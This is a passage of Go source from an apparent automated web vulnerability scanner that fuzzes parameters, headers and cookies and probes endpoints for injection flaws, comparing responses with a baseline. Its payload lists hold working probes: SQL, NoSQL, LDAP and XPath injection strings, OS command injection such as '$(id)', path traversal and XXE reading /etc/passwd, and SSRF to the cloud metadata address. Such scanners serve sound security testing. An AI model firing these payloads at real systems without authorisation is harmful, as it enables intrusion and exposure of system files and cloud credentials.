	Timestamp    string   `json:"timestamp"`
	Mode         string   `json:"mode"`
	Endpoint     string   `json:"endpoint"`
	Method       string   `json:"method"`
	Param        string   `json:"param"`
	Vector       string   `json:"vector"`
	MutatedURL   string   `json:"mutated_url"`
	Reasons      []string `json:"reasons"`
	BaselineCode int      `json:"baseline_status_code"`
	MutatedCode  int      `json:"mutated_status_code"`
	BaselineLen  int      `json:"baseline_length"`
	MutatedLen   int      `json:"mutated_length"`
	BaselineMS   int64    `json:"baseline_duration_ms"`
	MutatedMS    int64    `json:"mutated_duration_ms"`
	BaselineLoc  string   `json:"baseline_location"`
	MutatedLoc   string   `json:"mutated_location"`
}

type injectionHit struct {
	Timestamp    string   `json:"timestamp"`
	Family       string   `json:"family"`
	Endpoint     string   `json:"endpoint"`
	Method       string   `json:"method"`
	Param        string   `json:"param"`
	Payload      string   `json:"payload"`
	Vector       string   `json:"vector"`
	MutatedURL   string   `json:"mutated_url"`
	Reasons      []string `json:"reasons"`
	BaselineCode int      `json:"baseline_status_code"`
	MutatedCode  int      `json:"mutated_status_code"`
	BaselineLen  int      `json:"baseline_length"`
	MutatedLen   int      `json:"mutated_length"`
	BaselineMS   int64    `json:"baseline_duration_ms"`
	MutatedMS    int64    `json:"mutated_duration_ms"`
	BaselineLoc  string   `json:"baseline_location"`
	MutatedLoc   string   `json:"mutated_location"`
}

type csrfCandidate struct {
	Endpoint    string   `json:"endpoint"`
	Method      string   `json:"method"`
	Source      string   `json:"source"`
	QueryParams []string `json:"query_params,omitempty"`
}

type csrfReplayLog struct {
	Timestamp   string   `json:"timestamp"`
	Endpoint    string   `json:"endpoint"`
	Case        string   `json:"case"`
	Method      string   `json:"method"`
	StatusCode  int      `json:"status_code"`
	Length      int      `json:"length"`
	DurationMS  int64    `json:"duration_ms"`
	Location    string   `json:"location"`
	SetCookies  []string `json:"set_cookies,omitempty"`
	TokenHeader string   `json:"token_header,omitempty"`
}

type csrfFinding struct {
	Timestamp       string   `json:"timestamp"`
	Endpoint        string   `json:"endpoint"`
	Method          string   `json:"method"`
	Severity        string   `json:"severity"`
	Reasons         []string `json:"reasons"`
	BaselineCode    int      `json:"baseline_status_code"`
	CrossOriginCode int      `json:"cross_origin_status_code"`
	MissingOrigCode int      `json:"missing_origin_status_code"`
	BaselineLen     int      `json:"baseline_length"`
	CrossOriginLen  int      `json:"cross_origin_length"`
	MissingOrigLen  int      `json:"missing_origin_length"`
}

type injectionFamilyConfig struct {
	Name     string
	Payloads []string
	Keywords []string
}

const (
	paramFuzzMaxEndpoints         = 120
	paramFuzzMaxParamsPerEndpoint = 8
	paramFuzzHostDelay            = 250 * time.Millisecond
	paramFuzzRequestTimeout       = 12 * time.Second
	paramFuzzRetryCount           = 2
	injectionMaxEndpoints         = 40
	injectionMaxParamsPerEndpoint = 4
	serverInputMaxEndpoints       = 40
	serverInputMaxParamsPerEP     = 5
	advInjectionMaxEndpoints      = 35
	advInjectionMaxParamsPerEP    = 4
	csrfMaxEndpoints              = 60
)

var (
	paramFuzzHeaderKeys = []string{
		"X-Forwarded-For",
		"X-Original-URL",
		"X-Forwarded-Host",
		"X-Rewrite-URL",
		"X-HTTP-Method-Override",
		"X-Forwarded-Proto",
	}
	paramFuzzCommonParams = []string{
		"id", "user", "username", "email", "token", "access_token", "auth", "api_key", "key", "session", "redirect", "next", "return", "lang", "page", "sort", "limit", "offset", "role", "admin",
	}
	paramFuzzCommonCookies = []string{
		"session", "sessionid", "sid", "token", "auth", "jwt", "remember_me", "rememberme",
	}
	paramFuzzSignalKeywords = []string{
		"sql", "syntax error", "exception", "traceback", "stack trace", "internal server error", "undefined", "forbidden", "unauthorized", "invalid token",
	}
	injectionFamilies = []injectionFamilyConfig{
		{
			Name:     "sqli",
			Payloads: []string{"'", "\"", "' OR '1'='1"},
			Keywords: []string{"sql", "syntax error", "mysql", "postgres", "sqlite", "odbc", "database error"},
		},
		{
			Name:     "nosqli",
			Payloads: []string{`{"$ne":null}`, `{"$gt":""}`, "[$ne]=1"},
			Keywords: []string{"mongodb", "bson", "nosql", "cast to object", "operator"},
		},
		{
			Name:     "xpath",
			Payloads: []string{"' or '1'='1", "\" or \"1\"=\"1", "' and count(//*)>0 and '1'='1"},
			Keywords: []string{"xpath", "xquery", "xml parsing", "invalid predicate"},
		},
		{
			Name:     "ldap",
			Payloads: []string{"*)(uid=*))(|(uid=*", "*)(|(objectClass=*))", "*)(&(uid=*))"},
			Keywords: []string{"ldap", "invalid dn", "directory service", "search filter"},
		},
	}
	serverInputFamilies = []injectionFamilyConfig{
		{
			Name:     "os_command",
			Payloads: []string{";id", "|id", "$(id)", "`id`", "& whoami"},
			Keywords: []string{"uid=", "gid=", "command not found", "/bin/sh", "whoami", "nt authority"},
		},
		{
			Name:     "path_traversal",
			Payloads: []string{"../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\..\\windows\\win.ini"},
			Keywords: []string{"root:x:", "[fonts]", "for 16-bit app support", "windows", "win.ini", "no such file or directory"},
		},
		{
			Name:     "file_inclusion",
			Payloads: []string{"php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "http://127.0.0.1/"},
			Keywords: []string{"failed to open stream", "include_path", "warning: include", "root:x:", "<?php"},
		},
	}
	advInjectionFamilies = []injectionFamilyConfig{
		{
			Name:     "xxe",
			Payloads: []string{`<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>`, `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>`},
			Keywords: []string{"xml", "doctype", "entity", "parser error", "root:x:"},
		},
		{
			Name:     "soap",
			Payloads: []string{`<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><FaultProbe>1</FaultProbe></soap:Body></soap:Envelope>`},
			Keywords: []string{"soap", "envelope", "fault", "mustunderstand", "xml"},
		},
		{
			Name:     "ssrf",
			Payloads: []string{"http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "http://localhost:22/"},
			Keywords: []string{"connection refused", "timed out", "localhost", "metadata", "169.254.169.254"},
		},
		{
			Name:     "smtp",
			Payloads: []string{"test%0d%0aBcc:inject@local", "test\r\nBcc:inject@local", "x@y.com%0d%0aX-Test:1"},
			Keywords: []string{"smtp", "mail", "header", "invalid address", "bcc"},
		},
	}
	csrfTokenNames = []string{
		"csrf", "csrf_token", "csrftoken", "xsrf-token", "x-csrf-token", "x-xsrf-token", "_token", "__requestverificationtoken",
	}
)

func (a *App) runParamFuzz(ctx context.Context) error {
	baseDir := filepath.Dir(a.cfg.Lists.Domains)
	reconDir := filepath.Join(baseDir, "recon")
	rawDir := filepath.Join(reconDir, "raw", StepParamFuzz)
	paramsDir := filepath.Join(a.fuzzingBaseDir(), "params")
	if err := os.MkdirAll(rawDir, 0o755); err != nil {
		return err
	}
	if err := os.MkdirAll(paramsDir, 0o755); err != nil {
		return err
	}

	modePaths := map[string]string{
		"query":  filepath.Join(paramsDir, "query_hits.jsonl"),
		"body":   filepath.Join(paramsDir, "body_hits.jsonl"),
		"header": filepath.Join(paramsDir, "header_hits.jsonl"),
		"cookie": filepath.Join(paramsDir, "cookie_hits.jsonl"),
	}
	modeWriters := make(map[string]*bufio.Writer, len(modePaths))
	modeFiles := make(map[string]*os.File, len(modePaths))
	for mode, path := range modePaths {
		f, err := os.Create(path)
		if err != nil {
			return err
		}
		modeFiles[mode] = f
		modeWriters[mode] = bufio.NewWriter(f)
	}
	defer func() {
		for _, w := range modeWriters {
			_ = w.Flush()
		}
		for _, f := range modeFiles {
			_ = f.Close()
		}
	}()

	clients := &http.Client{
		Timeout: paramFuzzRequestTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	allURLsPath := filepath.Join(reconDir, "all_urls.txt")
	endpoints := a.collectParamFuzzEndpoints(allURLsPath)
	if len(endpoints) == 0 {
		a.logger.Printf("%s: no eligible endpoints in %s", StepParamFuzz, allURLsPath)
		_ = os.WriteFile(filepath.Join(reconDir, "params_candidates.txt"), []byte{}, 0o644)
		return a.writeParamFuzzSummary(filepath.Join(paramsDir, "summary.csv"), map[string]struct {
			requests int
			hits     int
		}{
			"query":  {},
			"body":   {},
			"header": {},
			"cookie": {},
		})
	}
	if len(endpoints) > paramFuzzMaxEndpoints {
		a.logger.Printf("%s: limiting endpoints from %d to %d for safe runtime", StepParamFuzz, len(endpoints), paramFuzzMaxEndpoints)
		endpoints = endpoints[:paramFuzzMaxEndpoints]
	}

	endpointParams, globalParams := extractParamCandidates(endpoints)
	for _, key := range paramFuzzCommonParams {
		globalParams[key] = struct{}{}
	}
	a.discoverParamsWithArjun(ctx, endpoints, rawDir, endpointParams, globalParams)
	a.discoverParamsWithX8(ctx, endpoints, rawDir, endpointParams, globalParams)

	var globalList []string
	for key := range globalParams {
		globalList = append(globalList, key)
	}
	sort.Strings(globalList)
	if err := os.WriteFile(filepath.Join(reconDir, "params_candidates.txt"), []byte(strings.Join(globalList, "\n")), 0o644); err != nil {
		return err
	}

	metrics := map[string]struct {
		requests int
		hits     int
	}{
		"query":  {},
		"body":   {},
		"header": {},
		"cookie": {},
	}
	lastByHost := make(map[string]time.Time)

	for _, endpoint := range endpoints {
		params := sortedParamKeys(endpointParams[endpoint])
		if len(params) == 0 {
			params = globalList
		}
		if len(params) > paramFuzzMaxParamsPerEndpoint {
			params = params[:paramFuzzMaxParamsPerEndpoint]
		}

		baseGET, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodGet, nil, nil, "")
		if err != nil {
			a.logger.Printf("%s: baseline GET failed for %s: %v", StepParamFuzz, endpoint, err)
			continue
		}
		basePOSTForm, _ := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}, []byte(""), "")
		basePOSTJSON, _ := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
			"Content-Type": "application/json",
		}, []byte(`{}`), "")

		for _, key := range params {
			mutatedURL := mutateURLQuery(endpoint, key, "BFLOWFUZZ123")
			if mutatedURL != "" {
				obs, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, mutatedURL, http.MethodGet, nil, nil, "")
				if err == nil {
					metrics["query"] = struct {
						requests int
						hits     int
					}{requests: metrics["query"].requests + 1, hits: metrics["query"].hits}
					if reasons := paramFuzzReasons(baseGET, obs); len(reasons) > 0 {
						metrics["query"] = struct {
							requests int
							hits     int
						}{requests: metrics["query"].requests, hits: metrics["query"].hits + 1}
						_ = writeJSONLine(modeWriters["query"], paramFuzzHit{
							Timestamp:    time.Now().UTC().Format(time.RFC3339),
							Mode:         "query",
							Endpoint:     endpoint,
							Method:       http.MethodGet,
							Param:        key,
							Vector:       "url-query",
							MutatedURL:   mutatedURL,
							Reasons:      reasons,
							BaselineCode: baseGET.StatusCode,
							MutatedCode:  obs.StatusCode,
							BaselineLen:  baseGET.Length,
							MutatedLen:   obs.Length,
							BaselineMS:   baseGET.DurationMS,
							MutatedMS:    obs.DurationMS,
							BaselineLoc:  baseGET.Location,
							MutatedLoc:   obs.Location,
						})
					}
				}
			}

			bodyForm := []byte(url.Values{key: []string{"BFLOWFUZZ123"}}.Encode())
			if basePOSTForm.StatusCode > 0 {
				obs, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
					"Content-Type": "application/x-www-form-urlencoded",
				}, bodyForm, "")
				if err == nil {
					metrics["body"] = struct {
						requests int
						hits     int
					}{requests: metrics["body"].requests + 1, hits: metrics["body"].hits}
					if reasons := paramFuzzReasons(basePOSTForm, obs); len(reasons) > 0 {
						metrics["body"] = struct {
							requests int
							hits     int
						}{requests: metrics["body"].requests, hits: metrics["body"].hits + 1}
						_ = writeJSONLine(modeWriters["body"], paramFuzzHit{
							Timestamp:    time.Now().UTC().Format(time.RFC3339),
							Mode:         "body",
							Endpoint:     endpoint,
							Method:       http.MethodPost,
							Param:        key,
							Vector:       "x-www-form-urlencoded",
							MutatedURL:   endpoint,
							Reasons:      reasons,
							BaselineCode: basePOSTForm.StatusCode,
							MutatedCode:  obs.StatusCode,
							BaselineLen:  basePOSTForm.Length,
							MutatedLen:   obs.Length,
							BaselineMS:   basePOSTForm.DurationMS,
							MutatedMS:    obs.DurationMS,
							BaselineLoc:  basePOSTForm.Location,
							MutatedLoc:   obs.Location,
						})
					}
				}
			}

			if basePOSTJSON.StatusCode > 0 {
				jsonBody, _ := json.Marshal(map[string]string{key: "BFLOWFUZZ123"})
				obs, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
					"Content-Type": "application/json",
				}, jsonBody, "")
				if err == nil {
					metrics["body"] = struct {
						requests int
						hits     int
					}{requests: metrics["body"].requests + 1, hits: metrics["body"].hits}
					if reasons := paramFuzzReasons(basePOSTJSON, obs); len(reasons) > 0 {
						metrics["body"] = struct {
							requests int
							hits     int
						}{requests: metrics["body"].requests, hits: metrics["body"].hits + 1}
						_ = writeJSONLine(modeWriters["body"], paramFuzzHit{
							Timestamp:    time.Now().UTC().Format(time.RFC3339),
							Mode:         "body",
							Endpoint:     endpoint,
							Method:       http.MethodPost,
							Param:        key,
							Vector:       "json",
							MutatedURL:   endpoint,
							Reasons:      reasons,
							BaselineCode: basePOSTJSON.StatusCode,
							MutatedCode:  obs.StatusCode,
							BaselineLen:  basePOSTJSON.Length,
							MutatedLen:   obs.Length,
							BaselineMS:   basePOSTJSON.DurationMS,
							MutatedMS:    obs.DurationMS,
							BaselineLoc:  basePOSTJSON.Location,
							MutatedLoc:   obs.Location,
						})
					}
				}
			}
		}

		for _, headerKey := range paramFuzzHeaderKeys {
			obs, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodGet, map[string]string{
				headerKey: "BFLOWFUZZ123",
			}, nil, "")
			if err != nil {
				continue
			}
			metrics["header"] = struct {
				requests int
				hits     int
			}{requests: metrics["header"].requests + 1, hits: metrics["header"].hits}
			if reasons := paramFuzzReasons(baseGET, obs); len(reasons) > 0 {
				metrics["header"] = struct {
					requests int
					hits     int
				}{requests: metrics["header"].requests, hits: metrics["header"].hits + 1}
				_ = writeJSONLine(modeWriters["header"], paramFuzzHit{
					Timestamp:    time.Now().UTC().Format(time.RFC3339),
					Mode:         "header",
					Endpoint:     endpoint,
					Method:       http.MethodGet,
					Param:        headerKey,
					Vector:       "request-header",
					MutatedURL:   endpoint,
					Reasons:      reasons,
					BaselineCode: baseGET.StatusCode,
					MutatedCode:  obs.StatusCode,
					BaselineLen:  baseGET.Length,
					MutatedLen:   obs.Length,
					BaselineMS:   baseGET.DurationMS,
					MutatedMS:    obs.DurationMS,
					BaselineLoc:  baseGET.Location,
					MutatedLoc:   obs.Location,
				})
			}
		}

		cookieNames := make(map[string]struct{})
		for _, c := range paramFuzzCommonCookies {
			cookieNames[c] = struct{}{}
		}
		for _, c := range baseGET.Cookies {
			cookieNames[c] = struct{}{}
		}
		var cookieList []string
		for c := range cookieNames {
			cookieList = append(cookieList, c)
		}
		sort.Strings(cookieList)
		if len(cookieList) > paramFuzzMaxParamsPerEndpoint {
			cookieList = cookieList[:paramFuzzMaxParamsPerEndpoint]
		}
		for _, cookieName := range cookieList {
			obs, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodGet, nil, nil, cookieName+"=BFLOWFUZZ123")
			if err != nil {
				continue
			}
			metrics["cookie"] = struct {
				requests int
				hits     int
			}{requests: metrics["cookie"].requests + 1, hits: metrics["cookie"].hits}
			if reasons := paramFuzzReasons(baseGET, obs); len(reasons) > 0 {
				metrics["cookie"] = struct {
					requests int
					hits     int
				}{requests: metrics["cookie"].requests, hits: metrics["cookie"].hits + 1}
				_ = writeJSONLine(modeWriters["cookie"], paramFuzzHit{
					Timestamp:    time.Now().UTC().Format(time.RFC3339),
					Mode:         "cookie",
					Endpoint:     endpoint,
					Method:       http.MethodGet,
					Param:        cookieName,
					Vector:       "cookie",
					MutatedURL:   endpoint,
					Reasons:      reasons,
					BaselineCode: baseGET.StatusCode,
					MutatedCode:  obs.StatusCode,
					BaselineLen:  baseGET.Length,
					MutatedLen:   obs.Length,
					BaselineMS:   baseGET.DurationMS,
					MutatedMS:    obs.DurationMS,
					BaselineLoc:  baseGET.Location,
					MutatedLoc:   obs.Location,
				})
			}
		}
	}

	summaryPath := filepath.Join(paramsDir, "summary.csv")
	if err := a.writeParamFuzzSummary(summaryPath, metrics); err != nil {
		return err
	}
	a.logger.Printf("%s: summary written to %s", StepParamFuzz, summaryPath)
	for mode, data := range metrics {
		a.logger.Printf("%s: mode=%s requests=%d hits=%d", StepParamFuzz, mode, data.requests, data.hits)
	}
	return nil
}

func (a *App) runInjectionChecks(ctx context.Context) error {
	baseDir := filepath.Dir(a.cfg.Lists.Domains)
	reconDir := filepath.Join(baseDir, "recon")
	injectionDir := filepath.Join(a.fuzzingBaseDir(), "injection")
	if err := os.MkdirAll(injectionDir, 0o755); err != nil {
		return err
	}

	outputFiles := map[string]string{
		"sqli":   filepath.Join(injectionDir, "sqli_hits.jsonl"),
		"nosqli": filepath.Join(injectionDir, "nosqli_hits.jsonl"),
		"xpath":  filepath.Join(injectionDir, "xpath_hits.jsonl"),
		"ldap":   filepath.Join(injectionDir, "ldap_hits.jsonl"),
	}
	writers := make(map[string]*bufio.Writer, len(outputFiles))
	files := make(map[string]*os.File, len(outputFiles))
	for family, path := range outputFiles {
		f, err := os.Create(path)
		if err != nil {
			return err
		}
		files[family] = f
		writers[family] = bufio.NewWriter(f)
	}
	defer func() {
		for _, w := range writers {
			_ = w.Flush()
		}
		for _, f := range files {
			_ = f.Close()
		}
	}()

	endpoints := a.collectParamFuzzEndpoints(filepath.Join(reconDir, "all_urls.txt"))
	if len(endpoints) > injectionMaxEndpoints {
		a.logger.Printf("%s: limiting endpoints from %d to %d", StepInjectionCheck, len(endpoints), injectionMaxEndpoints)
		endpoints = endpoints[:injectionMaxEndpoints]
	}

	globalParams := a.loadParamCandidates(filepath.Join(reconDir, "params_candidates.txt"))
	if len(globalParams) == 0 {
		globalParams = append([]string{}, paramFuzzCommonParams...)
		sort.Strings(globalParams)
	}

	clients := &http.Client{
		Timeout: paramFuzzRequestTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	lastByHost := make(map[string]time.Time)
	metrics := map[string]struct {
		requests int
		hits     int
	}{
		"sqli":   {},
		"nosqli": {},
		"xpath":  {},
		"ldap":   {},
	}

	for _, endpoint := range endpoints {
		parsed, err := url.Parse(endpoint)
		if err != nil {
			continue
		}
		paramSet := make(map[string]struct{})
		for key := range parsed.Query() {
			name := normalizeParamName(key)
			if name != "" {
				paramSet[name] = struct{}{}
			}
		}
		for _, p := range globalParams {
			paramSet[p] = struct{}{}
		}
		params := sortedParamKeys(paramSet)
		if len(params) > injectionMaxParamsPerEndpoint {
			params = params[:injectionMaxParamsPerEndpoint]
		}
		if len(params) == 0 {
			continue
		}

		baseGET, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodGet, nil, nil, "")
		if err != nil {
			a.logger.Printf("%s: baseline GET failed for %s: %v", StepInjectionCheck, endpoint, err)
			continue
		}
		basePOSTJSON, _ := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
			"Content-Type": "application/json",
		}, []byte(`{}`), "")

		for _, family := range injectionFamilies {
			for _, param := range params {
				for _, payload := range family.Payloads {
					mutatedURL := mutateURLQuery(endpoint, param, payload)
					if mutatedURL != "" {
						obs, reqErr := a.sendParamFuzzRequest(ctx, clients, lastByHost, mutatedURL, http.MethodGet, nil, nil, "")
						if reqErr == nil {
							metrics[family.Name] = struct {
								requests int
								hits     int
							}{requests: metrics[family.Name].requests + 1, hits: metrics[family.Name].hits}
							reasons := injectionReasons(baseGET, obs, family.Keywords)
							if len(reasons) > 0 {
								metrics[family.Name] = struct {
									requests int
									hits     int
								}{requests: metrics[family.Name].requests, hits: metrics[family.Name].hits + 1}
								_ = writeJSONLine(writers[family.Name], injectionHit{
									Timestamp:    time.Now().UTC().Format(time.RFC3339),
									Family:       family.Name,
									Endpoint:     endpoint,
									Method:       http.MethodGet,
									Param:        param,
									Payload:      payload,
									Vector:       "url-query",
									MutatedURL:   mutatedURL,
									Reasons:      reasons,
									BaselineCode: baseGET.StatusCode,
									MutatedCode:  obs.StatusCode,
									BaselineLen:  baseGET.Length,
									MutatedLen:   obs.Length,
									BaselineMS:   baseGET.DurationMS,
									MutatedMS:    obs.DurationMS,
									BaselineLoc:  baseGET.Location,
									MutatedLoc:   obs.Location,
								})
							}
						}
					}

					if family.Name == "nosqli" && basePOSTJSON.StatusCode > 0 {
						body, _ := json.Marshal(map[string]string{param: payload})
						obs, reqErr := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodPost, map[string]string{
							"Content-Type": "application/json",
						}, body, "")
						if reqErr == nil {
							metrics[family.Name] = struct {
								requests int
								hits     int
							}{requests: metrics[family.Name].requests + 1, hits: metrics[family.Name].hits}
							reasons := injectionReasons(basePOSTJSON, obs, family.Keywords)
							if len(reasons) > 0 {
								metrics[family.Name] = struct {
									requests int
									hits     int
								}{requests: metrics[family.Name].requests, hits: metrics[family.Name].hits + 1}
								_ = writeJSONLine(writers[family.Name], injectionHit{
									Timestamp:    time.Now().UTC().Format(time.RFC3339),
									Family:       family.Name,
									Endpoint:     endpoint,
									Method:       http.MethodPost,
									Param:        param,
									Payload:      payload,
									Vector:       "json-body",
									MutatedURL:   endpoint,
									Reasons:      reasons,
									BaselineCode: basePOSTJSON.StatusCode,
									MutatedCode:  obs.StatusCode,
									BaselineLen:  basePOSTJSON.Length,
									MutatedLen:   obs.Length,
									BaselineMS:   basePOSTJSON.DurationMS,
									MutatedMS:    obs.DurationMS,
									BaselineLoc:  basePOSTJSON.Location,
									MutatedLoc:   obs.Location,
								})
							}
						}
					}
				}
			}
		}
	}

	summaryPath := filepath.Join(injectionDir, "summary.csv")
	if err := a.writeInjectionSummary(summaryPath, metrics); err != nil {
		return err
	}
	a.logger.Printf("%s: summary written to %s", StepInjectionCheck, summaryPath)
	for family, row := range metrics {
		a.logger.Printf("%s: family=%s requests=%d hits=%d", StepInjectionCheck, family, row.requests, row.hits)
	}
	return nil
}

func (a *App) runServerInputChecks(ctx context.Context) error {
	baseDir := filepath.Dir(a.cfg.Lists.Domains)
	reconDir := filepath.Join(baseDir, "recon")
	outDir := filepath.Join(a.fuzzingBaseDir(), "server-input")
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return err
	}

	outputFiles := map[string]string{
		"os_command":     filepath.Join(outDir, "os_command_hits.jsonl"),
		"path_traversal": filepath.Join(outDir, "path_traversal_hits.jsonl"),
		"file_inclusion": filepath.Join(outDir, "file_inclusion_hits.jsonl"),
	}
	writers := make(map[string]*bufio.Writer, len(outputFiles))
	files := make(map[string]*os.File, len(outputFiles))
	for family, path := range outputFiles {
		f, err := os.Create(path)
		if err != nil {
			return err
		}
		files[family] = f
		writers[family] = bufio.NewWriter(f)
	}
	defer func() {
		for _, w := range writers {
			_ = w.Flush()
		}
		for _, f := range files {
			_ = f.Close()
		}
	}()

	endpoints := a.collectParamFuzzEndpoints(filepath.Join(reconDir, "all_urls.txt"))
	if len(endpoints) > serverInputMaxEndpoints {
		a.logger.Printf("%s: limiting endpoints from %d to %d", StepServerInputChk, len(endpoints), serverInputMaxEndpoints)
		endpoints = endpoints[:serverInputMaxEndpoints]
	}

	globalParams := a.loadParamCandidates(filepath.Join(reconDir, "params_candidates.txt"))
	if len(globalParams) == 0 {
		globalParams = append([]string{}, paramFuzzCommonParams...)
		sort.Strings(globalParams)
	}

	clients := &http.Client{
		Timeout: paramFuzzRequestTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	lastByHost := make(map[string]time.Time)
	metrics := map[string]struct {
		requests int
		hits     int
	}{
		"os_command":     {},
		"path_traversal": {},
		"file_inclusion": {},
	}

	for _, endpoint := range endpoints {
		parsed, err := url.Parse(endpoint)
		if err != nil {
			continue
		}
		paramSet := make(map[string]struct{})
		for key := range parsed.Query() {
			name := normalizeParamName(key)
			if name != "" {
				paramSet[name] = struct{}{}
			}
		}
		for _, p := range globalParams {
			paramSet[p] = struct{}{}
		}
		params := prioritizeServerInputParams(sortedParamKeys(paramSet))
		if len(params) > serverInputMaxParamsPerEP {
			params = params[:serverInputMaxParamsPerEP]
		}
		if len(params) == 0 {
			continue
		}

		baseGET, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodGet, nil, nil, "")
		if err != nil {
			a.logger.Printf("%s: baseline GET failed for %s: %v", StepServerInputChk, endpoint, err)
			continue
		}

		for _, family := range serverInputFamilies {
			for _, param := range params {
				for _, payload := range family.Payloads {
					mutatedURL := mutateURLQuery(endpoint, param, payload)
					if mutatedURL == "" {
						continue
					}
					obs, reqErr := a.sendParamFuzzRequest(ctx, clients, lastByHost, mutatedURL, http.MethodGet, nil, nil, "")
					if reqErr != nil {
						continue
					}
					metrics[family.Name] = struct {
						requests int
						hits     int
					}{requests: metrics[family.Name].requests + 1, hits: metrics[family.Name].hits}
					reasons := injectionReasons(baseGET, obs, family.Keywords)
					if len(reasons) == 0 {
						continue
					}
					metrics[family.Name] = struct {
						requests int
						hits     int
					}{requests: metrics[family.Name].requests, hits: metrics[family.Name].hits + 1}
					_ = writeJSONLine(writers[family.Name], injectionHit{
						Timestamp:    time.Now().UTC().Format(time.RFC3339),
						Family:       family.Name,
						Endpoint:     endpoint,
						Method:       http.MethodGet,
						Param:        param,
						Payload:      payload,
						Vector:       "url-query",
						MutatedURL:   mutatedURL,
						Reasons:      reasons,
						BaselineCode: baseGET.StatusCode,
						MutatedCode:  obs.StatusCode,
						BaselineLen:  baseGET.Length,
						MutatedLen:   obs.Length,
						BaselineMS:   baseGET.DurationMS,
						MutatedMS:    obs.DurationMS,
						BaselineLoc:  baseGET.Location,
						MutatedLoc:   obs.Location,
					})
				}
			}
		}
	}

	summaryPath := filepath.Join(outDir, "summary.csv")
	if err := a.writeServerInputSummary(summaryPath, metrics); err != nil {
		return err
	}
	a.logger.Printf("%s: summary written to %s", StepServerInputChk, summaryPath)
	for family, row := range metrics {
		a.logger.Printf("%s: family=%s requests=%d hits=%d", StepServerInputChk, family, row.requests, row.hits)
	}
	return nil
}

func (a *App) runAdvancedInjectionChecks(ctx context.Context) error {
	baseDir := filepath.Dir(a.cfg.Lists.Domains)
	reconDir := filepath.Join(baseDir, "recon")
	outDir := filepath.Join(a.fuzzingBaseDir(), "adv-injection")
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return err
	}

	outputFiles := map[string]string{
		"xxe":  filepath.Join(outDir, "xxe_hits.jsonl"),
		"soap": filepath.Join(outDir, "soap_hits.jsonl"),
		"ssrf": filepath.Join(outDir, "ssrf_hits.jsonl"),
		"smtp": filepath.Join(outDir, "smtp_hits.jsonl"),
	}
	writers := make(map[string]*bufio.Writer, len(outputFiles))
	files := make(map[string]*os.File, len(outputFiles))
	for family, path := range outputFiles {
		f, err := os.Create(path)
		if err != nil {
			return err
		}
		files[family] = f
		writers[family] = bufio.NewWriter(f)
	}
	defer func() {
		for _, w := range writers {
			_ = w.Flush()
		}
		for _, f := range files {
			_ = f.Close()
		}
	}()

	endpoints := a.collectParamFuzzEndpoints(filepath.Join(reconDir, "all_urls.txt"))
	if len(endpoints) > advInjectionMaxEndpoints {
		a.logger.Printf("%s: limiting endpoints from %d to %d", StepAdvInjection, len(endpoints), advInjectionMaxEndpoints)
		endpoints = endpoints[:advInjectionMaxEndpoints]
	}

	globalParams := a.loadParamCandidates(filepath.Join(reconDir, "params_candidates.txt"))
	if len(globalParams) == 0 {
		globalParams = append([]string{}, paramFuzzCommonParams...)
		sort.Strings(globalParams)
	}

	clients := &http.Client{
		Timeout: paramFuzzRequestTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	lastByHost := make(map[string]time.Time)
	metrics := map[string]struct {
		requests int
		hits     int
	}{
		"xxe":  {},
		"soap": {},
		"ssrf": {},
		"smtp": {},
	}

	for _, endpoint := range endpoints {
		parsed, err := url.Parse(endpoint)
		if err != nil {
			continue
		}
		paramSet := make(map[string]struct{})
		for key := range parsed.Query() {
			name := normalizeParamName(key)
			if name != "" {
				paramSet[name] = struct{}{}
			}
		}
		for _, p := range globalParams {
			paramSet[p] = struct{}{}
		}
		params := prioritizeAdvancedInjectionParams(sortedParamKeys(paramSet))
		if len(params) > advInjectionMaxParamsPerEP {
			params = params[:advInjectionMaxParamsPerEP]
		}
		if len(params) == 0 {
			continue
		}

		baseGET, err := a.sendParamFuzzRequest(ctx, clients, lastByHost, endpoint, http.MethodGet, nil, nil, "")
		if err != nil {
			a.logger.Printf("%s: baseline GET failed for %s: %v", StepAdvInjection, endpoint, err)
			continue
		}

		for _, family := range advInjectionFamilies {
			for _, param := range params {
				for _, payload := range family.Payloads {
					mutatedURL := mutateURLQuery(endpoint, param, payload)
					if mutatedURL == "" {
						continue
					}

					headers := map[string]string(nil)
					var body []byte
					method := http.MethodGet
					vector := "url-query"
					targetURL := mutatedURL

					if family.Name == "xxe" || family.Name == "soap" {
						method = http.MethodPost
						vector = "xml-body"
						targetURL = endpoint
						headers = map[string]string{"Content-Type": "application/xml"}
						body = []byte(payload)
						if family.Name == "soap" {
